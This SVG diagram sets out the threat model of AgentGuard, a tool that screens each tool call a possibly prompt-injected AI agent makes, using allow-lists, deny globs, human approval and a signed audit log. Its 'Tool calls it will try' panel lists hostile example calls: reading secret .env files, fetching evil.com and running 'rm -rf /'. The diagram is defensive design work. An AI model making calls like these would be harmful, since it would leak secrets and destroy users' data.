<svg xmlns="http://www.w3.org/2000/svg" width="1560" height="900" viewBox="0 0 1560 900" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif"><defs><marker id="ah-green" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,1.2 L9,5 L0,8.8 z" fill="#2f9e6e"/></marker><marker id="ah-pink" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,1.2 L9,5 L0,8.8 z" fill="#e05561"/></marker><marker id="ah-blue" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,1.2 L9,5 L0,8.8 z" fill="#4285f4"/></marker><marker id="ah-purple" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,1.2 L9,5 L0,8.8 z" fill="#8b5cf6"/></marker><marker id="ah-amber" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,1.2 L9,5 L0,8.8 z" fill="#e0a13a"/></marker><marker id="ah-cyan" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,1.2 L9,5 L0,8.8 z" fill="#2aa5b0"/></marker><marker id="ah-slate" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,1.2 L9,5 L0,8.8 z" fill="#8494ab"/></marker><marker id="ah-white" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,1.2 L9,5 L0,8.8 z" fill="#c9d3e2"/></marker><filter id="sh" x="-20%" y="-20%" width="140%" height="150%"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#1b2a4a" flood-opacity="0.10"/></filter></defs><rect width="1560" height="900" fill="#fbfcfe"/><text x="780.0" y="52" text-anchor="middle" font-size="27" font-weight="700" fill="#16203a">AgentGuard - threat model</text><text x="780.0" y="80" text-anchor="middle" font-size="14.5" fill="#6b7794">One prompt injection can turn an agent into a data-exfil or rm-rf machine - so every tool call is authorized at the runtime boundary.</text><rect x="48" y="150" width="350" height="360" rx="18" fill="#ffffff" fill-opacity="0.55" stroke="#e05561" stroke-width="1.5" stroke-dasharray="7 5" stroke-opacity="0.75"/><text x="66" y="141" font-size="13.5" font-weight="700" letter-spacing="0.4" fill="#9e2b36">1 - UNTRUSTED CALLER</text><rect x="68" y="190" width="310" height="87" rx="14" fill="#fde5e7" stroke="#e05561" stroke-width="1.8" filter="url(#sh)"/><g transform="translate(84,205) scale(0.8750)" fill="none" stroke="#e05561" stroke-width="2.0" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l9 16H3z"/><path d="M12 9v5"/><path d="M12 17.2v.1"/></g><text x="114" y="221" font-size="16.5" font-weight="700" fill="#9e2b36">Prompt-injected agent</text><text x="85" y="243.0" font-size="12.3" fill="#6b7794" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif">You cannot trust its intent -</text><text x="85" y="260.8" font-size="12.3" fill="#6b7794" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif">one injection and it turns hostile.</text><rect x="68" y="300" width="310" height="113.6" rx="11" fill="#fde5e7" stroke="#e05561" stroke-width="1.4" stroke-opacity="0.8"/><text x="84" y="324" font-size="13.2" font-weight="700" fill="#9e2b36">Tool calls it will try</text><text x="84" y="346" font-size="12.4" fill="#9e2b36" fill-opacity="0.92">read_file   /data/secrets/*.env</text><text x="84" y="364.4" font-size="12.4" fill="#9e2b36" fill-opacity="0.92">http_get    evil.com</text><text x="84" y="382.79999999999995" font-size="12.4" fill="#9e2b36" fill-opacity="0.92">run_shell   rm -rf /</text><text x="84" y="401.19999999999993" font-size="12.4" fill="#9e2b36" fill-opacity="0.92">write_file  (never allow-listed)</text><rect x="68" y="430" width="310" height="76.8" rx="11" fill="#eef1f6" stroke="#8494ab" stroke-width="1.4" stroke-opacity="0.8"/><text x="84" y="454" font-size="13.2" font-weight="700" fill="#3d4a63">Deny-by-default</text><text x="84" y="476" font-size="12.4" fill="#3d4a63" fill-opacity="0.92">Absent from the allow-list = denied.</text><text x="84" y="494.4" font-size="12.4" fill="#3d4a63" fill-opacity="0.92">No rule to allow it means no.</text><rect x="500" y="150" width="545" height="360" rx="18" fill="#ffffff" fill-opacity="0.55" stroke="#8b5cf6" stroke-width="1.5" stroke-dasharray="7 5" stroke-opacity="0.75"/><text x="518" y="141" font-size="13.5" font-weight="700" letter-spacing="0.4" fill="#552fae">2 - MEDIATE EVERY CALL</text><rect x="520" y="190" width="505" height="87" rx="14" fill="#ece5f9" stroke="#8b5cf6" stroke-width="1.8" filter="url(#sh)"/><g transform="translate(536,205) scale(0.8750)" fill="none" stroke="#8b5cf6" stroke-width="2.0" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l8 3v6c0 5-3.4 8.2-8 9-4.6-.8-8-4-8-9V6z"/></g><text x="566" y="221" font-size="16.5" font-weight="700" fill="#552fae">AgentGuard.guard()</text><text x="537" y="243.0" font-size="12.3" fill="#6b7794" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif">Intercepts the call before it runs.</text><text x="537" y="260.8" font-size="12.3" fill="#6b7794" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif">policy.evaluate() -&gt; ALLOW / DENY / APPROVE</text><path d="M760,258 L760,298" stroke="#8b5cf6" stroke-width="2.0" fill="none" marker-end="url(#ah-purple)"/><rect x="520" y="300" width="505" height="158" rx="14" fill="#ece5f9" stroke="#8b5cf6" stroke-width="1.8" filter="url(#sh)"/><g transform="translate(536,315) scale(0.8750)" fill="none" stroke="#8b5cf6" stroke-width="2.0" stroke-linecap="round" stroke-linejoin="round"><path d="M12 4v16"/><path d="M6 8h12"/><path d="M4 18h6l-3-7z"/><path d="M14 18h6l-3-7z"/></g><text x="566" y="331" font-size="16.5" font-weight="700" fill="#552fae">policy.evaluate() - in order</text><text x="537" y="353.0" font-size="12.3" fill="#6b7794" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif">1  tool on the allow-list?      else DENY</text><text x="537" y="370.8" font-size="12.3" fill="#6b7794" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif">2  constrained but no path?     DENY</text><text x="537" y="388.6" font-size="12.3" fill="#6b7794" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif">3  path hits a deny glob?       DENY (wins)</text><text x="537" y="406.4" font-size="12.3" fill="#6b7794" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif">4  path inside an allow glob?   else DENY</text><text x="537" y="424.2" font-size="12.3" fill="#6b7794" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif">5  domain in the allow-list?    else DENY</text><text x="537" y="442.0" font-size="12.3" fill="#6b7794" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif">6  high-risk require_approval?  APPROVE</text><rect x="1095" y="150" width="417" height="360" rx="18" fill="#ffffff" fill-opacity="0.55" stroke="#8494ab" stroke-width="1.5" stroke-dasharray="7 5" stroke-opacity="0.75"/><text x="1113" y="141" font-size="13.5" font-weight="700" letter-spacing="0.4" fill="#3d4a63">3 - DECISION</text><rect x="1115" y="190" width="377" height="69" rx="14" fill="#fde5e7" stroke="#e05561" stroke-width="1.8" filter="url(#sh)"/><g transform="translate(1131,205) scale(0.8750)" fill="none" stroke="#e05561" stroke-width="2.0" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M9 9l6 6M15 9l-6 6"/></g><text x="1161" y="221" font-size="16.5" font-weight="700" fill="#9e2b36">DENY</text><text x="1132" y="243.0" font-size="12.3" fill="#6b7794" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif">raise ToolBlockedError - nothing runs.</text><rect x="1115" y="283" width="377" height="104" rx="14" fill="#fdf1d6" stroke="#e0a13a" stroke-width="1.8" filter="url(#sh)"/><g transform="translate(1131,298) scale(0.8750)" fill="none" stroke="#e0a13a" stroke-width="2.0" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="4"/><path d="M4 21c0-4.4 3.6-7 8-7s8 2.6 8 7"/></g><text x="1161" y="314" font-size="16.5" font-weight="700" fill="#8c5a0d">APPROVE -&gt; human</text><text x="1132" y="336.0" font-size="12.3" fill="#6b7794" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif">High-risk tools wait on a person -</text><text x="1132" y="353.8" font-size="12.3" fill="#6b7794" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif">approve -&gt; ALLOW, else -&gt; DENY.</text><text x="1132" y="371.6" font-size="12.3" fill="#6b7794" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif">Never a silent auto-yes.</text><rect x="1115" y="411" width="377" height="87" rx="14" fill="#e3f5ec" stroke="#2f9e6e" stroke-width="1.8" filter="url(#sh)"/><g transform="translate(1131,426) scale(0.8750)" fill="none" stroke="#2f9e6e" stroke-width="2.0" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M8 12.5l2.6 2.6L16 9.6"/></g><text x="1161" y="442" font-size="16.5" font-weight="700" fill="#186547">ALLOW</text><text x="1132" y="464.0" font-size="12.3" fill="#6b7794" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif">execute(call) runs the tool,</text><text x="1132" y="481.8" font-size="12.3" fill="#6b7794" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif">only within its declared limits.</text><path d="M1025,333 L1055.0,333.0 Q1070,333 1070.0,318.0 L1070.0,235.0 Q1070,220 1085.0,220.0 L1113,220" stroke="#e05561" stroke-width="2.0" fill="none" marker-end="url(#ah-pink)"/><path d="M1025,333 L1069.0,333.0 Q1070,333 1070.0,332.0 L1070.0,332.0 Q1070,331 1071.0,331.0 L1113,331" stroke="#e0a13a" stroke-width="2.0" fill="none" marker-end="url(#ah-amber)"/><path d="M1025,333 L1055.0,333.0 Q1070,333 1070.0,348.0 L1070.0,438.0 Q1070,453 1085.0,453.0 L1113,453" stroke="#2f9e6e" stroke-width="2.0" fill="none" marker-end="url(#ah-green)"/><path d="M400,223 L518,223" stroke="#e05561" stroke-width="2.0" fill="none" marker-end="url(#ah-pink)"/><rect x="424.15999999999997" y="211.0" width="69.68" height="24.0" rx="12" fill="#ffffff" stroke="#e05561" stroke-opacity="0.4"/><text x="459.0" y="227.44" text-anchor="middle" font-size="12" font-weight="600" fill="#9e2b36">tool call</text><rect x="48" y="548" width="1464" height="150" rx="18" fill="#ffffff" fill-opacity="0.55" stroke="#2aa5b0" stroke-width="1.5" stroke-dasharray="7 5" stroke-opacity="0.75"/><text x="66" y="539" font-size="13.5" font-weight="700" letter-spacing="0.4" fill="#136b74">4 - TAMPER-EVIDENT AUDIT</text><rect x="68" y="584" width="884" height="87" rx="14" fill="#ddf3f5" stroke="#2aa5b0" stroke-width="1.8" filter="url(#sh)"/><g transform="translate(84,599) scale(0.8750)" fill="none" stroke="#2aa5b0" stroke-width="2.0" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></g><text x="114" y="615" font-size="16.5" font-weight="700" fill="#136b74">Signed, hash-chained audit log</text><text x="85" y="637.0" font-size="12.3" fill="#6b7794" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif">Every ALLOW / DENY / APPROVE becomes one entry.</text><text x="85" y="654.8" font-size="12.3" fill="#6b7794" font-family="Segoe UI,Inter,system-ui,-apple-system,sans-serif">Ed25519 signature over a SHA-256 prev_hash chain.</text><rect x="976" y="584" width="516" height="76.8" rx="11" fill="#e3f5ec" stroke="#2f9e6e" stroke-width="1.4" stroke-opacity="0.8"/><text x="992" y="608" font-size="13.2" font-weight="700" fill="#186547">verify_chain() proves it</text><text x="992" y="630" font-size="12.4" fill="#186547" fill-opacity="0.92">Any edit, reorder, truncate, or</text><text x="992" y="648.4" font-size="12.4" fill="#186547" fill-opacity="0.92">wrong-key forgery breaks the chain.</text><path d="M760,512 L760,582" stroke="#2aa5b0" stroke-width="2.0" fill="none" marker-end="url(#ah-cyan)"/><rect x="704.136" y="535.0" width="111.728" height="24.0" rx="12" fill="#ffffff" stroke="#2aa5b0" stroke-opacity="0.4"/><text x="760.0" y="551.44" text-anchor="middle" font-size="12" font-weight="600" fill="#136b74">guard.record()</text><rect x="48" y="726" width="720" height="113.6" rx="11" fill="#fdf1d6" stroke="#e0a13a" stroke-width="1.4" stroke-opacity="0.8"/><text x="64" y="750" font-size="13.2" font-weight="700" fill="#8c5a0d">The rule that surprises people</text><text x="64" y="772" font-size="12.4" fill="#8c5a0d" fill-opacity="0.92">A path-constrained tool called with no path is DENIED -</text><text x="64" y="790.4" font-size="12.4" fill="#8c5a0d" fill-opacity="0.92">you can't prove it's in bounds, so 'unchecked' resolves to no.</text><text x="64" y="808.8" font-size="12.4" fill="#8c5a0d" fill-opacity="0.92">Deny globs beat allow globs: a secret stays unreachable</text><text x="64" y="827.1999999999999" font-size="12.4" fill="#8c5a0d" fill-opacity="0.92">even under a broad allow rule.</text><rect x="792" y="726" width="720" height="113.6" rx="11" fill="#eef1f6" stroke="#8494ab" stroke-width="1.4" stroke-opacity="0.8"/><text x="808" y="750" font-size="13.2" font-weight="700" fill="#3d4a63">Non-goals - stated honestly</text><text x="808" y="772" font-size="12.4" fill="#3d4a63" fill-opacity="0.92">Not a sandbox: it authorizes the call, it does not contain</text><text x="808" y="790.4" font-size="12.4" fill="#3d4a63" fill-opacity="0.92">execution. Pair it with OS-level isolation.</text><text x="808" y="808.8" font-size="12.4" fill="#3d4a63" fill-opacity="0.92">Tamper-evident, not tamper-proof: one Ed25519 signer, so</text><text x="808" y="827.1999999999999" font-size="12.4" fill="#3d4a63" fill-opacity="0.92">catching the key holder needs an external witness.</text><text x="780.0" y="882" text-anchor="middle" font-size="12" fill="#6b7794">parag-labs/agent-guard</text></svg>